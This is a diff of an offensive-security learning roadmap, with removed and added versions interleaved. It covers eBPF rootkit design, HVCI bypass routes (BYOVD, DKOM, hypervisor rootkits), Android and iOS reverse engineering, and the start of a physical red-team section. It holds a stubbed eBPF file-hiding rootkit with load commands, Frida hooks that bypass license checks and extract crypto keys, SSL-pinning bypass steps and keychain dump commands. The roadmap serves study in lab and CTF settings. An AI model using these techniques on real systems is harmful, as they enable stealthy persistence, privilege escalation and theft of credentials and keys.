+| [ebpfkit - reference implementation](https://github.com/Gui774ume/ebpfkit) | GitHub | 5 hrs | FREE | Study the source. Understand every technique. |
+| [Tetragon (Cilium)](https://github.com/cilium/tetragon) | GitHub | 3 hrs | FREE | Study the DEFENSE to understand the offense. |
+| [eBPF Security - BlackHat talks](https://www.youtube.com/results?search_query=ebpf+security+blackhat+2023+2024) | YouTube | 4 hrs | FREE | Multiple talks. Watch anything from 2022+. |
+
+```c
+// eBPF rootkit: hide files via getdents64 hook
+// Requirements: CAP_BPF or CAP_SYS_ADMIN (root or privileged container)
+// No kernel module, no disk artifact, survives across reboots if pinned to bpffs
 
 #include <linux/bpf.h>
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_tracing.h>
+#include <linux/dirent.h>
 
-// Map: store PIDs or filenames to hide
+// Map: filenames to hide (key = filename string, value = 1 = hidden)
 struct {
     __uint(type, BPF_MAP_TYPE_HASH);
     __type(key, char[64]);
-    __type(value, u8);
+    __type(value, __u8);
     __uint(max_entries, 256);
 } hidden_files SEC(".maps");
 
-// Hook on getdents64 return: filter output
+// Hook: on exit of getdents64 syscall
+// This runs AFTER the kernel filled the user buffer with directory entries
+// We walk the entries and remove any matching our hidden_files map
 SEC("tp/syscalls/sys_exit_getdents64")
-int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx) {
-    // Read user-space buffer containing directory entries
-    // Walk entries, find any matching hidden_files map
-    // Adjust d_reclen of previous entry to skip hidden file
-    // Target sees directory without the hidden file
+int hook_getdents64(struct trace_event_raw_sys_exit *ctx) {
+    // Read the user-space buffer pointer (from syscall args via map)
+    // Walk linux_dirent64 entries in the buffer
+    // For each entry: check if d_name is in hidden_files
+    // If hidden: adjust previous entry's d_reclen to skip this entry
+    //            (the reader skips from prev_entry + prev_entry->d_reclen directly)
+    //            → hidden file vanishes from ls, find, etc.
     return 0;
 }
 
 char LICENSE[] SEC("license") = "GPL";
 
-// Compile:
-// clang -O2 -target bpf -c rootkit.bpf.c -o rootkit.bpf.o
-// Load: bpftool prog load rootkit.bpf.o /sys/fs/bpf/rootkit
-// Or: use libbpf skeleton in userspace loader
-
 // eBPF rootkit capabilities:
-// - Hide processes (filter /proc entries)
-// - Hide files (hook getdents64)
-// - Hide network connections (hook tcp_seq_show)
-// - Hide ports (filter netstat output)
-// - Keylogging (hook read() on ttys)
-// - Network backdoor (XDP program, process packets before kernel)
-// - Privilege escalation: hook execve, setuid to 0 on specific trigger
-// - Persistence: bpffs pin → survives across program executions
+// - Hide processes:      hook /proc reads (getdents on /proc)
+// - Hide network:        hook tcp_seq_show / netlink
+// - Keylogging:          hook read() on /dev/tty, /dev/pts/*
+// - Network backdoor:    XDP program to process packets before kernel network stack
+// - Privilege escalation: hook execve(), on trigger phrase → bpf_override_return()
+//                         to escalate before execve() completes
+// - Persistence:         pin program to /sys/fs/bpf/ → survives across program exits
 ```
-
----
-
-## MOBILE SECURITY BASICS
-
-### Goal
-Initial triage of mobile attack surface. Dedicated mobile specialization warrants its own roadmap; this covers enough to identify vulnerabilities and test basic attack scenarios.
-
----
-
-### Android
-
-**Time:** 3–4 weeks | **MITRE:** T1417, T1516
-
-| Resource | Type | Duration | Cost | Notes |
-|----------|------|----------|------|-------|
-| [Android Security Internals](https://nostarch.com/androidsecurity) | Book | 20 hours | $40 | Thorough. Architecture, IPC, permissions. |
-| [Frida Android Tutorial](https://www.youtube.com/watch?v=PkSy41UpIoE) | YouTube | 2 hours | FREE | Dynamic instrumentation. Essential tool. |
-| [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF) | Tool | 3 hours | FREE | Auto static + dynamic analysis. |
 
 ```bash
-# APK reverse engineering
-apktool d target.apk -o target_decompiled/  # Decode resources
-jadx -d target_jadx/ target.apk             # Decompile to Java
-# Read AndroidManifest.xml: exported activities, permissions, deep links
+# Compile eBPF program:
+clang -O2 -target bpf -c rootkit.bpf.c -o rootkit.bpf.o
 
-# Dynamic analysis setup
-# adb: Android Debug Bridge (install Android SDK)
-adb devices                           # Connected devices
-adb shell                             # Shell on device
-adb install target.apk
-adb logcat | grep -i "target.package" # App logs, often leaks data
+# Load into running kernel:
+bpftool prog load rootkit.bpf.o /sys/fs/bpf/my_rootkit
 
-# Frida: dynamic instrumentation - hook Java methods at runtime
-# https://frida.re
-pip install frida-tools
+# Attach to tracepoint:
+bpftool prog attach /sys/fs/bpf/my_rootkit tracepoint ...
 
-# Hook a method:
-frida -U -f com.target.app --no-pause -l hook.js
+# Or use libbpf skeleton (modern approach: see ebpfkit source for example)
 
-# hook.js:
-Java.perform(function() {
-    var MainActivity = Java.use('com.target.app.MainActivity');
-    MainActivity.checkLicense.implementation = function(key) {
-        console.log('[*] checkLicense called with: ' + key);
-        return true;  // Bypass license check
-    };
-    
-    // Hook cryptographic operations to extract keys
-    var Cipher = Java.use('javax.crypto.Cipher');
-    Cipher.doFinal.overload('[B').implementation = function(data) {
-        console.log('[*] Cipher.doFinal input: ' + bytesToHex(data));
-        var result = this.doFinal(data);
-        console.log('[*] Cipher.doFinal output: ' + bytesToHex(result));
-        return result;
-    };
-});
-
-# SSL pinning bypass (common in banking apps)
-# Frida script: objection (automated)
-pip install objection
-objection -g com.target.app explore
-# In objection shell:
-android sslpinning disable
-
-# Network traffic with Burp:
-# Install Burp CA on device → proxy traffic through Burp
-# Android 7+: apps don't trust user CAs → use Frida or root
+# List running eBPF programs (how defenders see you):
+bpftool prog list
+# This is why advanced eBPF rootkits also hook bpftool's output
+# to hide themselves from bpftool list (hook the bpf() syscall)
 ```
 
 ---
 
-### iOS
+## 12. HVCI, VBS & KERNEL SECURITY 2026–2027
 
-**Time:** 3–4 weeks | **MITRE:** T1417
-
-```bash
-# Requires: jailbroken device OR simulator for some techniques
-
-# Static analysis
-# Download IPA → unzip → extract binary from Payload/App.app/
-# Or: use frida-ios-dump to pull IPA from jailbroken device
-
-# Reverse engineering iOS binary
-# otool: Apple's objdump equivalent
-otool -l App.app/AppBinary | grep -A 3 LC_ENCRYPTION  # Check if encrypted
-# If encrypted: pull from jailbroken device → automatically decrypted
-
-# Class-dump: extract Objective-C headers
-class-dump App.app/AppBinary -H --output headers/
-
-# Frida iOS:
-frida -U -f com.target.app --no-pause -l hook.js
-
-# hook.js for Obj-C:
-ObjC.classes.NSURLSession.dataTaskWithRequest_completionHandler_.implementation =
-    ObjC.implement(ObjC.classes.NSURLSession.dataTaskWithRequest_completionHandler_,
-    function(self, sel, request, completion) {
-        console.log('[*] NSURLSession request: ' + request.URL());
-        return this.dataTaskWithRequest_completionHandler_(request, completion);
-    });
-
-# SSL pinning bypass on iOS
-# objection iOS:
-objection -g com.target.app explore
-ios sslpinning disable
-
-# Keychain dump (jailbreak)
-keychain-dumper -a   # Dump all keychain items, often has tokens/passwords
-```
-
-
----
-
-## HVCI, VBS & KERNEL SECURITY 2025–2026
-
-### Architecture
+### Architecture Overview
 
 ```
-Virtualization-Based Security (VBS) - the new kernel threat model:
+Virtualization-Based Security (VBS): The 2026 Kernel Threat Model:
 
-┌─────────────────────────────────────────────────────────────┐
-│  Normal World (VTL0)          Secure World (VTL1)          │
-│  ┌─────────────┐              ┌─────────────────────────┐   │
-│  │ User Space  │              │ Secure Kernel (SK)      │   │
-│  │             │              │ ├── HVCI enforcement    │   │
-│  │ Windows     │     VTL1     │ ├── Credential Guard    │   │
-│  │ Kernel      │◄────────────►│ ├── Code Integrity      │   │
-│  │ (ntoskrnl)  │              │ └── Device Guard        │   │
-│  └─────────────┘              └─────────────────────────┘   │
-│       ▲                                  ▲                   │
-│       └─────────── Hypervisor ───────────┘                   │
-│                   (Hyper-V, VBS layer)                       │
-└─────────────────────────────────────────────────────────────┘
+┌─────────────────────────────────────────────────────────────────┐
+│  VTL 0 (Normal World)          VTL 1 (Secure World)           │
+│  ┌─────────────────┐          ┌───────────────────────────┐    │
+│  │  User Space     │          │  Secure Kernel (SK)       │    │
+│  │  (Ring 3)       │          │  ├── HVCI enforcement     │    │
+│  │                 │          │  ├── Credential Guard      │    │
+│  │  Windows Kernel │  VTL1    │  ├── Code Integrity (CI)  │    │
+│  │  (Ring 0,VTL0)  │◄────────►│  └── Device Guard (DG)   │    │
+│  └─────────────────┘          └───────────────────────────┘    │
+│         ▲                                ▲                      │
+│         └──────── Hypervisor (Hyper-V) ──┘                      │
+└─────────────────────────────────────────────────────────────────┘
 
 HVCI (Hypervisor-Protected Code Integrity):
-- All kernel code must be signed and validated by Secure Kernel
-- Even if attacker has kernel R/W: cannot execute unsigned code
-- Traditional rootkits: load malicious driver → BLOCKED
-- DKOM still works (modify data structures, not execute code)
-- Shellcode in kernel: BLOCKED
+  All kernel-mode code pages must be signed and validated by VTL1 Secure Kernel.
+  Even with ring-0 arbitrary write: you CANNOT execute unsigned code in the kernel.
+  Classic rootkits that load unsigned drivers: BLOCKED.
+  Shellcode in kernel pool: BLOCKED.
 ```
 
-### What HVCI Kills and What Survives
+### What HVCI Kills vs What Survives
 
 ```
 KILLED by HVCI:
-✗ Unsigned kernel drivers (even with test signing)
-✗ Runtime patching of kernel code
-✗ Shellcode execution in kernel pool
-✗ Most classic rootkit techniques
-✗ PatchGuard bypass via unsigned code
+  ✗ Unsigned kernel drivers (even with test signing mode)
+  ✗ Runtime modification of kernel code pages (.text patching)
+  ✗ Shellcode in kernel pool / stack
+  ✗ Most classic DKOM-via-shellcode approaches
+  ✗ PatchGuard bypass via unsigned code
 
-SURVIVES HVCI:
-✓ DKOM: kernel data manipulation (no code execution needed)
-  → Still hide processes, files, network connections
-  → Modify EPROCESS.Protection → clear PPL
-  → Modify token → elevate privileges
+SURVIVES HVCI (your 2026-2027 toolkit):
+  ✓ DKOM: kernel DATA manipulation (no code execution required)
+      - Modify EPROCESS.Token           → SYSTEM privileges
+      - Modify EPROCESS.Protection      → clear PPL (Protected Process Light)
+      - Remove EPROCESS from ActiveProcessLinks → hide process
+      All via arbitrary kernel READ/WRITE (not execute)
 
-✓ BYOVD: if driver is SIGNED (even if vulnerable)
-  → LOLDrivers that are legitimately signed still load
-  → Use their vulnerable IOCTLs for arbitrary kernel R/W
-  → R/W sufficient for DKOM without executing shellcode
+  ✓ BYOVD (Bring Your Own Vulnerable Driver)
+      - Load a legitimately-SIGNED but vulnerable driver
+      - Use its IOCTL vulnerability for arbitrary kernel R/W
+      - Combine with DKOM → full SYSTEM access without unsigned code
+      - Reference: loldrivers.io for the signed driver list
 
-✓ Hypervisor-based rootkit (ring -1)
-  → Run below Windows entirely
-  → VT-x/AMD-V: insert yourself as hypervisor under Windows
-  → Windows becomes your guest
-  → Full visibility and control: HVCI doesn't protect ring -1
+  ✓ Hypervisor Rootkit (Ring -1 / VMX Root)
+      - Insert yourself as the hypervisor BELOW Windows
+      - Windows + HVCI become your guest VM
+      - You operate at VMX root mode → above HVCI entirely
+      - HVCI cannot protect ring-1 from ring-1
 
-✓ Firmware implants (UEFI level)
-  → Below hypervisor
-  → Ultimate persistence
+  ✓ Firmware Implants (UEFI/SPI flash level)
+      - Below the hypervisor
+      - Ultimate persistence, extremely hard to detect
+      - Survive OS reinstall, hard drive replacement
 
-✓ Credential Guard bypass
-  → LSASS no longer stores NTLM hashes in memory (protected by VSM)
-  → But: DC still handles auth → DCSync still works
-  → Kerberos tickets still in LSASS memory (just not NTLM)
-  → Constrained delegation attacks unaffected
+  ✓ Credential Guard bypass
+      - LSASS no longer stores NTLM hashes in accessible memory
+      - But: DCSync against the DC still works (DC handles auth)
+      - Kerberos tickets still in LSASS memory (readable)
+      - Constrained/unconstrained delegation attacks unaffected
 ```
 
 ### Hypervisor Rootkit (Ring -1)
 
 ```
-HVCI-resistant technique: Blue Pill style
-Become the hypervisor UNDER Windows
+HVCI-resistant technique: become the hypervisor UNDER Windows.
+Reference implementations for study:
+  - SimpleVisor:    https://github.com/ionescu007/SimpleVisor
+  - HyperPlatform:  https://github.com/tandasat/HyperPlatform
 
-Process:
-1. Exploit vulnerability that gives kernel execution (or BYOVD kernel R/W)
-2. From kernel: VmxOn → become the VMM
-3. VmxLaunch → Windows becomes your guest
-4. Now running at VMX root mode (ring -1 effectively)
-5. Intercept VMCALL, I/O ports, MSR reads: Windows cannot detect
-
-Implementation reference:
-- SimpleVisor: https://github.com/ionescu007/SimpleVisor
-  Educational hypervisor. Study to understand VMX programming.
-- HyperPlatform: https://github.com/tandasat/HyperPlatform
-  Platform for hypervisor research.
+Execution flow:
+1. Get kernel execution (BYOVD, unpatched driver vuln, or HEVD)
+2. From ring-0: VMXON → CPU enters VMX operation mode
+3. VMLAUNCH → Windows continues as a guest in your VM
+4. You now run at VMX root mode (effectively ring -1)
+5. Install VM exit handlers: intercept CPUID, RDMSR, I/O ports, EPT violations
 
 What you can do from ring -1:
-- Hide memory regions from Windows page tables (EPT manipulation)
-- Intercept all system calls (no hook needed; handle at VMX exit)
-- Read/write any physical memory regardless of HVCI
-- Hide your driver from kernel module list
-- Make your pages appear as normal kernel pages to Windows
+  - EPT (Extended Page Tables) manipulation:
+      Hide your memory: make your pages appear as normal kernel pages
+      Shadow pages: present a clean view to Windows, execute different code
+  - Intercept ALL system calls (no kernel hook needed: handle at VMX exit)
+  - Read/write any physical memory bypassing HVCI
+      (HVCI enforces via EPT: you control EPT, so you can bypass your own enforcement)
+  - Hide your driver from kernel module list via EPT splitting
 
-Detection difficulty: Extreme
-- Timing side-channels (CPUID, RDTSC anomalies)
-- Hypervisor detection APIs (cpuid leaf 0x40000000)
-- Blue team: check if VT-x is in use by something not Hyper-V
+Detection by defenders:
+  - Timing anomalies (RDTSC/CPUID take longer when executed in a VM)
+  - CPUID leaf 0x40000000 → hypervisor present bit
+  - Check if VT-x is in use by something other than Hyper-V
+  - Hypervisor-specific CPUID signature
 ```
+
+---
+
+## 13. MOBILE SECURITY - ANDROID + iOS
+
+### Goal
+Initial triage of mobile attack surface. Android is more fully covered; iOS gets deeper treatment than Phase 3 original (though dedicated mobile warrants its own roadmap).
+
+---
+
+### Android Security
+
+### Time: 3–4 weeks | MITRE: T1417, T1516
+
+| Resource | Type | Duration | Cost | Notes |
+|---|---|---|---|---|
+| [Android Security Internals](https://nostarch.com/androidsecurity) | Book | 20 hrs | $40 | Architecture, IPC, permissions. Thorough. |
+| [Frida Android Tutorial](https://www.youtube.com/watch?v=PkSy41UpIoE) | YouTube | 2 hrs | FREE | Dynamic instrumentation. Essential tool. |
+| [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF) | Tool | 3 hrs | FREE | Automated static + dynamic analysis. |
+| [Android App Reverse Engineering 101](https://www.ragingrock.com/AndroidAppRE/) | Guide | 5 hrs | FREE | Excellent structured guide. |
+
+```bash
+# ── APK Reverse Engineering ───────────────────────────────────────────────────
+apktool d target.apk -o target_decompiled/    # Decode resources + smali code
+jadx -d target_jadx/ target.apk               # Decompile .dex → Java (cleaner)
+# Read AndroidManifest.xml:
+#   - exported="true" activities, receivers, services → entry points
+#   - permissions declared → what data the app can access
+#   - deep link schemes (intent-filter) → potential injection points
+
+# ── Dynamic Analysis Setup ────────────────────────────────────────────────────
+adb devices                            # list connected devices/emulators
+adb shell                              # shell on device
+adb install target.apk                 # install APK
+adb logcat | grep -i "target.package"  # monitor app logs (often leaks data)
+adb logcat | grep -E "Error|Exception|password|token|key"  # grep for secrets
+
+# ── Frida Dynamic Instrumentation ────────────────────────────────────────────
+pip3 install frida-tools
+# Start frida-server on device (must match Frida version):
+adb push frida-server-<ver>-android-x86_64 /data/local/tmp/frida-server
+adb shell "chmod 755 /data/local/tmp/frida-server && /data/local/tmp/frida-server &"
+
+# Inject hook script:
+frida -U -f com.target.app --no-pause -l hook.js
+
+# hook.js: license bypass
+Java.perform(function() {
+    var MainActivity = Java.use('com.target.app.util.LicenseChecker');
+    MainActivity.isLicenseValid.implementation = function() {
+        console.log('[*] License check hooked → returning true');
+        return true;
+    };
+
+    // Hook cryptographic operations to extract keys at runtime
+    var SecretKeySpec = Java.use('javax.crypto.spec.SecretKeySpec');
+    SecretKeySpec.$init.overload('[B', 'java.lang.String').implementation = function(key, algo) {
+        console.log('[*] Crypto key (' + algo + '): ' + bytesToHex(key));
+        return this.$init(key, algo);
+    };
+});
+
+# ── SSL Pinning Bypass ────────────────────────────────────────────────────────
+# Objection (automated bypass framework):
+pip3 install objection
+objection -g com.target.app explore
+# In objection shell:
+android sslpinning disable        # bypass all SSL pinning implementations
+android intent launch_activity com.target.app/.MainActivity
+
+# Manual Frida SSL bypass (when objection fails: custom pinning):
+# Use: https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/
+
+# ── Network Traffic Interception ──────────────────────────────────────────────
+# Install Burp CA on device (for Android < 7.0: trusts user CAs):
+# Settings → Security → Install from storage → select Burp cert
+# For Android 7.0+ (doesn't trust user CAs by default):
+#   Option 1: Root device, move cert to system store
+#   Option 2: Modify network_security_config.xml in APK, repackage
+#   Option 3: Use Frida SSL bypass (above): works without root
+```
+
+---
+
+### iOS Security
+
+### Time: 3–4 weeks | MITRE: T1417
+
+| Resource | Type | Duration | Cost | Notes |
+|---|---|---|---|---|
+| [iOS App Security Assessments](https://mas.owasp.org/MASTG/iOS/) | Guide | 8 hrs | FREE | OWASP MASTG iOS section. Comprehensive. |
+| [Frida iOS Tutorial](https://www.frida.re/docs/ios/) | Docs | 3 hrs | FREE | Official Frida iOS guide. |
+| [iOS Reverse Engineering - Azeria](https://azeria-labs.com/ios-application-security-part-1-getting-started/) | Blog | 4 hrs | FREE | Good intro to jailbroken device analysis. |
+| [Project Zero iOS blogs](https://googleprojectzero.blogspot.com/search/label/iOS) | Blog | ongoing | FREE | Read all. State of the art iOS security research. |
+
+```bash
+# ── Static Analysis ───────────────────────────────────────────────────────────
+# Download IPA:
+# From App Store: use frida-ios-dump on jailbroken device (decrypted IPA)
+# Or: TestFlight builds, corporate MDM profiles
+
+# Extract binary:
+unzip target.ipa -d target_ipa/
+# Binary is at: target_ipa/Payload/AppName.app/AppName
+
+# Check encryption:
+otool -l target_ipa/Payload/AppName.app/AppName | grep -A 4 LC_ENCRYPTION_INFO_64
+# cryptid = 1 → encrypted (need jailbroken device to decrypt)
+# cryptid = 0 → not encrypted (can analyze directly)
+
+# Check security features:
+otool -hv AppName | grep -E "PIE|STACK_CANARIES"
+codesign -d --entitlements - AppName   # view entitlements (capabilities)
+
+# Decompile (after decryption if needed):
+# Ghidra / IDA Pro / Hopper: open binary → ARM64 decompilation
+# class-dump (Objective-C headers):
+class-dump AppName -H --output headers/
+# For Swift: use nm or strings (Swift metadata is more complex)
+nm -gU AppName | grep -v ' U '   # list defined Swift symbols
+
+# ── Dynamic Analysis (Jailbroken Device Required for Full Access) ─────────────
+# Modern jailbreaks (2025-2026): checkra1n, Palera1n (A11+)
+# Without jailbreak: simulator-based testing (limited)
+
+# Frida on iOS:
+# Install Frida via Cydia/Sileo on jailbroken device
+# frida-server runs as root, intercepts all apps
+
+frida -U -f com.target.app --no-pause -l hook.js
+
+# hook.js for Objective-C:
+// Hook NSURLSession to log all HTTP requests
+var session = ObjC.classes.NSURLSession;
+Interceptor.attach(session['- dataTaskWithRequest:completionHandler:'].implementation, {
+    onEnter: function(args) {
+        var request = ObjC.Object(args[2]);
+        console.log('[*] URL: ' + request.URL().absoluteString());
+        // Dump headers:
+        var headers = request.allHTTPHeaderFields();
+        console.log('[*] Headers: ' + headers);
+    }
+});
+
+# Hook Swift function (by symbol name):
+var moduleBase = Module.findBaseAddress('AppName');
+var targetFunc = moduleBase.add(0x12345);   // offset from Ghidra/IDA
+Interceptor.attach(targetFunc, {
+    onEnter: function(args) { console.log('Hooked Swift func, arg0: ' + args[0]); }
+});
+
+# ── SSL Pinning Bypass on iOS ─────────────────────────────────────────────────
+# Objection iOS:
+pip3 install objection
+objection -g com.target.app explore
+# In objection shell:
+ios sslpinning disable
+
+# Manual hook (when objection fails):
+# https://codeshare.frida.re/@dki/ios10-ssl-bypass/
+
+# ── Keychain Dump (Jailbreak) ─────────────────────────────────────────────────
+# Keychain holds: tokens, passwords, certificates, session keys
+keychain-dumper -a         # dump all keychain items
+# Or via objection:
+ios keychain dump          # extract keychain from target app's container
+
+# ── iOS Security Architecture (Know What You're Targeting) ───────────────────
+# TCC (Transparency, Consent, Control):
+#   Controls camera, mic, location, contacts, photos access
+#   Bypass: find process already with permission, inject into it (Frida)
+#   Or: exploit TCC daemon (tccd) directly
+#
+# SIP (System Integrity Protection):
+#   Protects /System, /usr, /bin, /sbin even as root
+#   Only disabled by kernel (not even root can bypass without exploit)
+#
+# Sandbox:
+#   Each app in isolated container (/var/mobile/Containers/Data/Application/<UUID>/)
+#   Sandbox escapes: traditionally via kernel vulnerabilities
+#   Study: Project Zero iOS sandbox escape write-ups
+```
+
+---
+
+## 14. MILESTONES CHECKLIST
+
+### Phase 3 Completion Requirements
+
+**Binary Exploitation:**
+- [ ] LiveOverflow series: every video, coded along, not just watched
+- [ ] Written at least 3 complete pwntools exploits from scratch
+- [ ] Stack overflow exploit: no protections
+- [ ] Stack canary bypass: leaked via format string, preserved in overflow
+- [ ] ASLR bypass: information leak → libc base calculation → ret2libc
+- [ ] PIE bypass: leaked binary address → adjusted gadget offsets
+- [ ] ROP Emporium: all 8 challenges complete with own solutions
+
+**Shellcode:**
+- [ ] Written x86-64 Linux `/bin/sh` shellcode from scratch, null-free
+- [ ] Written x86-64 Windows WinExec shellcode (via PEB walk or msfvenom study)
+- [ ] Written AArch64 Linux `/bin/sh` shellcode from scratch
+- [ ] Can explain every byte in your shellcode
+
+**Format Strings:**
+- [ ] Leaked canary and libc address via format string in same payload
+- [ ] Arbitrary write via `%n` on a partial-RELRO binary
+- [ ] Explained why GOT overwrite fails on full-RELRO and identified alternate target
+
+**Heap:**
+- [ ] Use-After-Free: reclaimed freed chunk, controlled function pointer
+- [ ] Tcache poisoning: arbitrary allocation on glibc 2.31
+- [ ] Safe-Linking bypass: arbitrary allocation on glibc 2.35 target
+- [ ] Read all of how2heap: understood every technique
+
+**Linux Kernel:**
+- [ ] QEMU kernel debug lab set up and working
+- [ ] LKM vulnerability exploited: root shell in VM
+- [ ] Analyzed real CVE from lkmidas series: root cause in own words
+- [ ] Explained: SMEP, SMAP, KASLR, KPTI bypasses
+
+**Windows Kernel:**
+- [ ] WinDbg kernel debugging: two-VM setup working
+- [ ] HEVD loaded and confirmed in WinDbg
+- [ ] HEVD Stack Overflow: token steal → SYSTEM shell on Windows 10/11 VM
+- [ ] Identified EPROCESS.Token offset for your specific Windows build
+
+**ARM64:**
+- [ ] AArch64 calling convention explained without reference
+- [ ] AArch64 execve shellcode written from scratch, tested via qemu-aarch64
+- [ ] PAC explained: what it signs, what key is used, two bypass primitives named
+
+**CFG:**
+- [ ] Explained CFG bitmap mechanism
+- [ ] Listed three CFG bypass techniques with concrete implementation plan for each
+- [ ] Found at least one CFG-valid useful call target in a Windows binary
+
+**eBPF + HVCI:**
+- [ ] eBPF rootkit: read ebpfkit source, understood getdents64 hook
+- [ ] HVCI/VBS: explained what is killed, what survives, why BYOVD works
+- [ ] Ring-1 architecture: explained hypervisor rootkit concept with flow
+
+**Mobile:**
+- [ ] Android: APK decompiled with jadx, Frida hook written and tested
+- [ ] Android: SSL pinning bypassed with objection or manual Frida script
+- [ ] iOS: IPA extracted and analyzed, class-dump output read
+- [ ] iOS: Frida hook on iOS target tested
+
+**CTF Progress:**
+- [ ] 10+ pwn challenges on pwnable.kr solved
+- [ ] 5+ challenges on pwn.college binary exploitation path
+- [ ] ROP Emporium all 8 complete
+- [ ] At least 2 kernel pwn challenges from lkmidas series
+
+---
+
+## CTF PLATFORMS - PROGRESSION ORDER
+
+| Platform | Focus | Start When | Cost |
+|---|---|---|---|
+| [pwn.college](https://pwn.college) | Binary exploitation, structured path | Day 1 of Phase 3 | FREE |
+| [ROP Emporium](https://ropemporium.com) | ROP chains specifically | After Week 4 | FREE |
+| [pwnable.kr](https://pwnable.kr) | Mixed binary challenges | After Week 6 | FREE |
+| [pwnable.tw](https://pwnable.tw) | Harder binary + heap | After Week 12 | FREE |
+| [HackTheBox - Pwn category](https://hackthebox.com) | Realistic targets | After Week 16 | $14/mo |
+| [lkmidas kernel series](https://github.com/lkmidas/learning-kernel-exploitation) | Kernel exploitation | After Week 20 | FREE |
+| [KCTF challenges](https://google.github.io/kctf/) | Kernel CTF | After Week 24 | FREE |
+
+---
+
+## LAB SETUP SUMMARY
+
+| Lab Component | Purpose | How to Set Up |
+|---|---|---|
+| Ubuntu 22.04 VM | Primary exploitation lab | VirtualBox / VMware |
+| pwndbg + pwntools | Exploit development | `setup.sh` + `pip3 install pwntools` |
+| QEMU AArch64 | ARM64 exploitation | `apt install qemu-system-arm` |
+| QEMU x86-64 kernel | Linux kernel exploitation | Build or use lkmidas images |
+| Windows 10/11 VM #1 | HEVD target | Windows eval ISO (Microsoft) |
+| Windows 10/11 VM #2 | WinDbg debugger | Same |
+| HEVD driver | Windows kernel practice | https://github.com/hacksysteam/HackSysExtremeVulnerableDriver |
+| Jailbroken iOS device (optional) | iOS dynamic analysis | checkra1n / palera1n |
+
+---
+
+## KEY REFERENCES
+
+| Topic | Resource |
+|---|---|
+| x86-64 Linux syscalls | [chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md) |
+| AArch64 Linux syscalls | [man7.org/linux/man-pages/man2/syscall.2.html](https://man7.org/linux/man-pages/man2/syscall.2.html) |
+| glibc Safe-Linking | [how2heap safe_linking.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.32/safe_linking.c) |
+| HEVD exploit collection | [h0mbre/Windows-Kernel-Exploits](https://github.com/h0mbre/Windows-Kernel-Exploits) |
+| Windows Kernel offsets | [ntoskrnl.exe offsets database](https://github.com/mrexodia/ntoskrnl-versions) |
+| CFG internals | [connormcgarr.github.io](https://connormcgarr.github.io/) |
+| eBPF rootkit reference | [ebpfkit](https://github.com/Gui774ume/ebpfkit) |
+| LOLDrivers (BYOVD list) | [loldrivers.io](https://www.loldrivers.io/) |
+| iOS Project Zero | [googleprojectzero.blogspot.com - iOS tag](https://googleprojectzero.blogspot.com/search/label/iOS) |
+| Android MASTG | [mas.owasp.org/MASTG](https://mas.owasp.org/MASTG/) |
+
+---
 
 ---
 
@@ -17766,361 +19556,3003 @@ That is what you are building toward.
 
 ---
 
-## PHASE 6: SPECIAL OPERATIONS
+# PHASE 6: SPECIAL OPERATIONS
 
-**Time:** Parallel track | **Prerequisite:** Phase 4 complete
+<div align="right">
 
-Phase 6 covers operational domains that sit outside the technical exploitation stack but are required at the GREATEST level: physical access, formal red team operations, and the quantum computing threat horizon. These are not optional: the top 0.0001% operate in all of these domains simultaneously.
+**When the terminal is not enough.**
 
-## PHYSICAL RED TEAM
+</div>
 
-### Goal
-Badges, tailgating, and hardware implants. Physical access bypasses most security stacks. Most red team assessments skip it. Most organizations have never tested it.
+**Duration:** 6–18 months (ongoing) | **Difficulty:** Advanced–Elite | **Hours/Week:** 40+ (Unlimited) | **Prerequisites:** Phase 4 complete | **Track:** Parallel (run alongside Phase 4–5) | **Completion Rate:** Top 0.0001% 
 
 ---
 
-### Curriculum
+---
 
-#### **1. RFID / NFC Badge Cloning**
+## WHY PHASE 6 EXISTS
+
+Every phase before this one lives in a terminal window. Phase 6 is what happens when the terminal is not enough.
+
+The GREATEST operators do not wait for a phishing link to land. They walk in through the front door, plug in their own hardware, sit down at a machine nobody watches, and leave before the coffee gets cold. They understand that the strongest firewall in the world means nothing if a person holds the door open. They understand that RSA-4096 will be a liability within a decade and they are already collecting the traffic to prove it. They understand that a red team report nobody can read is a red team that never happened.
+
+This phase covers four domains that separate top-0.001% operators from everyone else:
+
+1. **Physical Red Team**: getting inside the building before getting inside the network
+2. **Social Engineering**: the human attack surface, standalone and deep
+3. **Quantum Computing 2027**: the cryptographic threat horizon and how to exploit the transition period
+4. **Red Team Operations**: scoping, ROE, reporting, debrief, re-test
+
+At the end of this phase there is a **full end-to-end scenario** that chains everything (physical entry, hardware implant, C2 callback, AD compromise, and report delivery) into a single operation walkthrough.
+
+---
+
+## SECTION 1: PHYSICAL RED TEAM
+
+> **Mindset before tools:** Physical security is a people problem dressed as a technology problem. Locks, badges, and cameras are all defeated by confidence, context, and preparation. The technical tools matter. The performance matters more.
+
+---
+
+### 1.1 LOCKPICKING - THE FOUNDATIONAL SKILL
+
+**Why this comes first:** Before RFID cloners, before implants, before tailgating, there are doors. Locked doors. Most organizations spend thousands on access control systems and leave the door itself protected by a $30 wafer lock from 2009. Lockpicking is legal to practice in most jurisdictions on locks you own. Own locks. Practice daily.
+
+#### Understanding How Locks Work
+
+```
+PIN TUMBLER LOCK (most common: deadbolts, padlocks, offices):
+
+  Plug (rotating cylinder) sits inside the Shell (fixed housing)
+  
+  Spring → Driver Pin → Key Pin → Keyway
+  
+  At rest: Driver pins cross the Shear Line → plug cannot rotate
+  With correct key: all key pins pushed to exact height →
+    shear line cleared → plug rotates → lock opens
+  
+  With picks: we manually lift each pin stack to the shear line
+    one at a time using TENSION + PICK
+
+  Shear line = the gap between plug and shell
+              ←------------------------------------>
+  Shell  ████████████████████████████████████████
+                ↑ shear line
+  Plug          ████████████████████████████████
+
+WAFER LOCK (filing cabinets, cheap padlocks, older cars):
+  Flat wafers instead of pin stacks
+  All wafers must align with shell groove → plug rotates
+  Easier to pick than pin tumbler
+
+DISC DETAINER (Abloy, some Medeco):
+  Rotating discs with notches: must all align
+  Defeated by specialized disc detainer picks
+  Harder: avoid for beginners
+```
+
+#### The Beginner's Kit
+
+```
+STARTER KIT ($35-60):
+  Sparrows Reload Kit (sparrowslockpicks.com)
+    Includes:
